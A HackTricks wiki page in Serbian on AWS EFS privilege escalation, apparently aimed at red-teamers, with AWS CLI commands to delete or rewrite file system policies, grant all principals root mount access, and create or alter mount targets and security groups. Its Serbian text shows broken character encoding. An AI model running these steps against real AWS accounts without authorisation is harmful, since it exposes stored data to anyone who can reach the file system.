# AWS - EFS Privesc

{% hint style="success" %}
U캜ite i ve쬭ajte hakovanje AWS-a:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
U캜ite i ve쬭ajte hakovanje GCP-a: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}

## EFS

Vi코e **informacija o EFS-u** u:

{% content-ref url="../aws-services/aws-efs-enum.md" %}
[aws-efs-enum.md](../aws-services/aws-efs-enum.md)
{% endcontent-ref %}

Zapamtite da biste montirali EFS, morate biti u podsistemu gde je EFS izlo쬰n i imati pristup (sigurnosne grupe). Ako se to de코ava, po difoltu 캖ete uvek mo캖i da ga montirate, me캠utim, ako je za코ti캖en IAM politikama, morate imati dodatna ovla코캖enja navedena ovde da biste mu pristupili.

### `elasticfilesystem:DeleteFileSystemPolicy`|`elasticfilesystem:PutFileSystemPolicy`

Sa bilo kojim od ovih ovla코캖enja napada캜 mo쬰 **promeniti politiku fajl sistema** da vam **omogu캖i pristup**, ili jednostavno da je **obri코e** tako da je omogu캖en **podrazumevani pristup**.

Za brisanje politike:
```bash
aws efs delete-file-system-policy \
--file-system-id <value>
```
Da promenite:
```json
aws efs put-file-system-policy --file-system-id <fs-id> --policy file:///tmp/policy.json

// Give everyone trying to mount it read, write and root access
// policy.json:
{
"Version": "2012-10-17",
"Id": "efs-policy-wizard-059944c6-35e7-4ba0-8e40-6f05302d5763",
"Statement": [
{
"Sid": "efs-statement-2161b2bd-7c59-49d7-9fee-6ea8903e6603",
"Effect": "Allow",
"Principal": {
"AWS": "*"
},
"Action": [
"elasticfilesystem:ClientRootAccess",
"elasticfilesystem:ClientWrite",
"elasticfilesystem:ClientMount"
],
"Condition": {
"Bool": {
"elasticfilesystem:AccessedViaMountTarget": "true"
}
}
}
]
}
```
### `elasticfilesystem:ClientMount|(elasticfilesystem:ClientRootAccess)|(elasticfilesystem:ClientWrite)`

Sa ovla코캖enjem, napada캜 캖e mo캖i da **montira EFS**. Ako dozvola za pisanje nije podrazumevano data svima koji mogu da montiraju EFS, ima캖e samo **pristup za 캜itanje**.
```bash
sudo mkdir /efs
sudo mount -t efs -o tls,iam  <file-system-id/EFS DNS name>:/ /efs/
```
Dodatna dozvola `elasticfilesystem:ClientRootAccess` i `elasticfilesystem:ClientWrite` mogu se koristiti za **pisanje** unutar fajl sistema nakon 코to je montiran i za **pristup** tom fajl sistemu **kao root**.

**Potencijalni uticaj:** Indirektno eskaliranje privilegija lociranjem osetljivih informacija u fajl sistemu.

### `elasticfilesystem:CreateMountTarget`

Ako je napada캜 unutar **podmre쬰** gde **nema monta쬹og cilja** EFS-a, mo쬰 jednostavno **kreirati jedan u svojoj podmre쬴** sa ovom privilegijom:
```bash
# You need to indicate security groups that will grant the user access to port 2049
aws efs create-mount-target --file-system-id <fs-id> \
--subnet-id <value> \
--security-groups <value>
```
**Potencijalni uticaj:** Indirektno podizanje privilegija lociranjem osetljivih informacija u fajl sistemu.

### `elasticfilesystem:ModifyMountTargetSecurityGroups`

U scenariju gde napada캜 otkrije da EFS ima monta쬹i cilj u njegovoj podmre쬴 ali **nijedna sigurnosna grupa ne dozvoljava saobra캖aj**, on bi mogao jednostavno **promeniti to modifikuju캖i odabrane sigurnosne grupe**:
```bash
aws efs modify-mount-target-security-groups \
--mount-target-id <value> \
--security-groups <value>
```
**Potencijalni uticaj:** Indirektno eskaliranje privilegija pronala쬰njem osetljivih informacija u fajl sistemu.



{% hint style="success" %}
Nau캜ite i ve쬭ajte hakovanje AWS-a:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Obuka AWS Crveni Tim Ekspert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Nau캜ite i ve쬭ajte hakovanje GCP-a: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Obuka GCP Crveni Tim Ekspert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Podr쬴te HackTricks</summary>

* Proverite [**planove pretplate**](https://github.com/sponsors/carlospolop)!
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite hakovanje trikova slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
{% endhint %}
